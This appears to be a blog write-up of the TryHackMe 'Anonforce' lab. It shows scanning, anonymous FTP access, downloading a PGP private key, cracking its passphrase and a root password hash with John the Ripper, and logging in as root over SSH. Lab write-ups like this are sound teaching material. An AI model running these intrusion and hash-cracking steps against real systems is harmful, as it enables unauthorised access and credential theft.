---
layout: post
title: "THM - Anonforce"
date: 2022-02-04
categories: [Tryhackme, Easy]
tags: [security]
image: ../../assets/img/posts/Anonforce/anonforce.png 

---

## Description

You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth. 

|**Room**|[Anonforce](https://tryhackme.com/room/bsidesgtanonforce)|
|:---:|:---:|
|**OS**|Linux|
|**Difficulty**|Easy|
|**Creator**|[stuxnet](https://tryhackme.com/p/stuxnet)|

---

Deploy the machine and quickly scan the ports with rustscan,

```bash
rustscan -a $IP
```

![rustscan](../../assets/img/posts/Anonforce/rustscan.png)

we get 2 open port. Lets scan this using nmap,

```bash
nmap -sV -sC -p21,22 $IP -oN nmap.txt
```

![nmap1](../../assets/img/posts/Anonforce/nmap1.png)
![nmap2](../../assets/img/posts/Anonforce/nmap2.png)
Result scan reveals that port 21 is running vsftpd with anonymous login and port 22 is running ssh service. Enumerate port 21.

Lets connect to ftp service,

```bash
ftp $IP
```

![ftp1](../../assets/img/posts/Anonforce/ftp1.png)
we got in.

Establishing directory content,

![ftp2](../../assets/img/posts/Anonforce/ftp2.png)

navigating to home directory and list directory content,

![ftp3](../../assets/img/posts/Anonforce/ftp3.png)

we got melodias user.

navigating to user directory and list directory content,

![ftp4](../../assets/img/posts/Anonforce/ftp4.png)

we got our user flag. But since we cannot read it, we can take this user.txt file on our system using `get`,

```bash
get user.txt
```

![ftp5](../../assets/img/posts/Anonforce/ftp5.png)

Now, there is also a **notread** directory in system directory as well, so taking a look inside directory reveals that there are 2 files backup.pgp file and private.asc,

![ftp6](../../assets/img/posts/Anonforce/ftp6.png)

We can get these files on our system,

```bash
get backup.pgp
get private.asc
```

We can convert this key into crack-able hash,

```bash
gpg2john private.asc > crackmejohn
```

Now using JTR, we can crack the hash,

```bash
john crackmejohn --wordlist=/usr/share/wordlists/rockyou.txt
```

![john](../../assets/img/posts/Anonforce/john.png)

we got our password, `*******`.

Now, we can import this private key so that we can decrypt the backup key,

```bash
gpg --import private.asc
```

![gpg](../../assets/img/posts/Anonforce/gpg.png)

Now, we can decrypt the backup.pgp file using the password we got,

```bash
gpg --output backup --decrypt backup.pgp
```

![gpg2](../../assets/img/posts/Anonforce/gpg2.png)

Reading the content of backup we just decrypted,

![hashes](../../assets/img/posts/Anonforce/hashes.png)

We got the password hash of root user.

Let's put this hash in a file,

```bash
echo "<hash-string>" > root_hash
```

Now, using JTR to crack this hash,

```bash
john root_hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![john2](../../assets/img/posts/Anonforce/john2.png)

We can get into machine via ssh,

```bash
ssh root@$IP
```

![ssh](../../assets/img/posts/Anonforce/ssh.png)

we get in as root user.
